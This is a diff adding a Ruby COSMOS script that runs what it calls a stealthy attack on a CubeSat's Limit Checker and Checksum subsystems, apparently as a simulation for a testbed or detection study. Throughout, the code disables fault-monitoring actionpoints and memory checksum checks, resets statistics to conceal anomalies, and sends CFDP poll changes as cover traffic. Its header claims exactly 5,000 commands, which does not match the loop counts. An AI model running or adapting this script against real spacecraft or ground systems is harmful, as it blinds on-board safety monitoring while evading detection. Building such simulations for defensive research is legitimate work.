@@ -1,0 +1,97 @@
+# LC Actionpoint & Checksum Disable Simulation Script
+# #
+# Description:
+# This script simulates a stealthy state manipulation and monitoring disablement attack
+# on a CubeSat's Limit Checker (LC) and Checksum (CS) subsystems. It performs exactly
+# 5,000 total commands including:
+# - Initializing all 176 LC Actionpoints (APs) to ACTIVE state
+# - Selectively transitioning APs to PASSIVE or DISABLED states
+# - Disabling checksum validation for associated memory entries
+# - Periodic resets of AP statistics to mask anomalous behavior
+# - Periodic CFDP poll parameter changes to create cover traffic
+#
+# All transitions and memory actions are valid, structured commands and avoid brute-force
+# behavior, making this attack realistic and subtle. The sequence is timed to reflect
+# operational pacing and reduce detection likelihood.
+
+require 'cosmos/script'
+
+# Parameters:
+
+AP_RANGE = (1..176).freeze       # All valid LC AP numbers
+VALID_STATES = [2, 3]            # LC_APSTATE_PASSIVE and LC_APSTATE_DISABLED
+
+# Generates a valid LC or CS command.
+# Chooses between:
+# - LC_SET_AP_STATE for state transitions (66%)
+# - CS_DISABLE_ENTRY_MEMORY for monitoring disablement (33%)
+def generate_valid_lc_command(initialized_aps)
+  case rand(3)
+  when 0, 1
+    ["LC_SET_AP_STATE", {
+      "APNUMBER" => initialized_aps.sample,
+      "NEWAPSTATE" => VALID_STATES.sample
+    }]
+  when 2
+    ["CS_DISABLE_ENTRY_MEMORY", {
+      "ENTRYID" => initialized_aps.sample * 1000  # ENTRYID format: APNUM * 1000
+    }]
+  end
+end
+
+# Executes the structured attack sequence:
+# 1. Activates LC system
+# 2. Initializes all APs to ACTIVE
+# 3. Performs 4,824 varied manipulation commands
+#    including structured LC/CS commands, periodic resets, and cover traffic
+def execute_stable_attack
+  set_line_delay(1.0)           # Introduce a realistic command delay
+  initialized_aps = []
+
+  # Step 1: Activate LC subsystem before any AP manipulation
+  cmd_raw("CFS", "LC_SET_LC_STATE", {
+    "NEWLCSTATE" => 1,          # LC_STATE_ACTIVE
+    "PADDING" => 0
+  })
+
+  # Step 2: Initialize all APs to ACTIVE state to avoid invalid transitions
+  AP_RANGE.each do |ap|
+    cmd_raw("CFS", "LC_SET_AP_STATE", {
+      "APNUMBER" => ap,
+      "NEWAPSTATE" => 1          # LC_APSTATE_ACTIVE
+    })
+    initialized_aps << ap
+  end
+
+  # Step 3: Structured manipulation loop (4824 commands)
+  4824.times do |i|
+    cmd_name, params = generate_valid_lc_command(initialized_aps)
+    cmd_raw("CFS", cmd_name, params)
+
+    # Every 100 commands: Issue a CFDP poll parameter update
+    if i % 100 == 0
+      cmd_raw("CFS", "CF_SET_POLL_PARAMETER", {
+        "CHAN" => 0,
+        "DIRECTORY" => 1,
+        "CLASS" => 1,
+        "PRIORITY" => 1,
+        "PRESERVE" => 0,
+        "PEER_ENTITY_ID" => "0.21",
+        "SRCPATH" => "/cf/poll_#{rand(100)}/",
+        "DSTPATH" => "/ground_station_#{rand(10)}/"
+      })
+    end
+
+    # Every 500 commands: Reset stats for a random AP to conceal anomalies
+    if i % 500 == 0
+      cmd_raw("CFS", "LC_RESET_AP_STATS", {
+        "APNUMBER" => initialized_aps.sample,
+        "PADDING" => 0
+      })
+    end
+  end
+end
+
+execute_stable_attack
+
+
